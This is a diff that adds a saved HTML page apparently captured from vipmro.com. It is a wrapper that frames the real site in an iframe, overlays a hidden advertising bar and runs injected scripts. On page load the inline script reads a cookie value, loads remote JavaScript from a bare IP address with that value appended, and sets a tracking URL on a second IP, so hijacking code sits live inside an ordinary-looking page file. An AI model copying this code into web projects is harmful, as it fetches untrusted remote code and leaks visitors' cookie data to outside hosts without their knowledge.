@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<!-- saved from url=(0022)http://www.vipmro.com/ -->
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <style>html {
+        height: 100%;
+    }</style>
+    <script async="" src="./regist_files/interurl.jsp" type="text/javascript"></script>
+</head>
+<body style="background-color:transparent; margin:0px; height:100%">
+<div id="nocxw_close"
+     style="width: 275px; height: 28px; margin: 0px auto; background-color: rgb(232, 232, 232); position: fixed; bottom: 85px; display: none; left: 1120px;">
+    &nbsp;&nbsp;<input type="radio" id="ctype" name="ctype" checked="" value="1"><span
+        style="font-size: 14px; font-family:微软雅黑;color:#3A5FCD;">本次关闭</span> <input type="radio" id="ctype" name="ctype"
+                                                                                    value="2"><span
+        style="font-size: 14px; font-family:微软雅黑;color:#3A5FCD;">本月关闭</span> &nbsp;&nbsp;<input type="button"
+                                                                                                id="buttons"
+                                                                                                name="buttons"
+                                                                                                style="border:0;color:#3A5FCD;font-size: 14px; background-color: #D1D1D1;font-family:微软雅黑; height: 28px; width: 43px"
+                                                                                                value="确定"
+                                                                                                onclick="addtype();">
+</div>
+<div id="nocxw_gxtb"
+     style="width: 950px; height: 85px; margin: 0px auto; color: rgb(255, 255, 255); position: fixed; bottom: 0px; left: 475px; display: none;">
+    <iframe id="nocxw_ifr" width="100%" height="85px" frameborder="0" scrolling="no"
+            src="./regist_files/additv170320.html"></iframe>
+    <a id="nocxw_clsimg" href="javascript:void(0);"
+       onclick="document.getElementById(&#39;nocxw_gxtb&#39;).style.display=&#39;none&#39;;document.getElementById(&#39;nocxw_close&#39;).style.display=&#39;none&#39;;"
+       style="color: rgb(0, 0, 0); background-color: rgb(209, 209, 209); float: right; position: absolute; top: 0px; right: 0px; width: 15px; height: 20px; text-decoration: none;"><b>✕</b></a><a
+        id="nocxw_clsimgsz" href="javascript:void(0);"
+        onclick="document.getElementById(&#39;nocxw_close&#39;).style.display=&#39;block&#39;;"
+        style="color: rgb(0, 0, 0); background-color: rgb(209, 209, 209); float: right; position: absolute; top: 0px; right: 15px; width: 23px; height: 20px; text-decoration: none;">☰</a>
+</div>
+<div id="v" name="v" style="display:block;clear:both;margin:0px;width:100%;height:100%;color:#FFF;">
+    <iframe id="m" name="m" width="1920" height="100%" frameborder="0"
+            src="./regist_files/saved_resource.html"></iframe>
+</div>
+<script>(function () {
+    var d = document;
+    var uki = d.cookie.split("; ");
+    var wP_v;
+    for (var i = 0; i < uki.length; i++) {
+        var arr = uki[i].split("=");
+        if ("wP_v" == arr[0]) {
+            wP_v = arr[1];
+            break;
+        }
+        ;
+    }
+    ;var f = d.location.href;
+    var ua = navigator.userAgent.toLowerCase();
+    var url = "http://202.102.41.15:8081/abc/interurl.jsp?b=2&a=&v";
+    var head = d.getElementsByTagName("head")[0];
+    var im = d.getElementById("m");
+    var tb = d.createElement('script');
+    tb.async = "true";
+    tb.src = url.replace(/&v/, wP_v);
+    tb.type = 'text/javascript';
+    head.appendChild(tb);
+    if (ua.indexOf("windows") < 0) {
+        var meta = d.createElement('meta');
+        meta.name = "viewport";
+        meta.content = "width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0,user-scalable=no";
+        head.appendChild(meta);
+    }
+    ;im.src = f + (f.indexOf("&") < 0 ? '?' : '&') + '_t=t';
+    if (ua.indexOf("iphone") > 0) {
+        im.width = window.innerWidth;
+        im.scrolling = "no";
+    }
+    ;window.addEventListener("resize", function () {
+        im.width = window.innerWidth;
+    }, false);
+})();</script>
+<script>document.getElementById("v").src = "http://221.231.148.199/1.htm?k=$314$0$0$" + new Date().getTime() + "$" + Math.random() + "$0";</script>
+</body>
+</html>
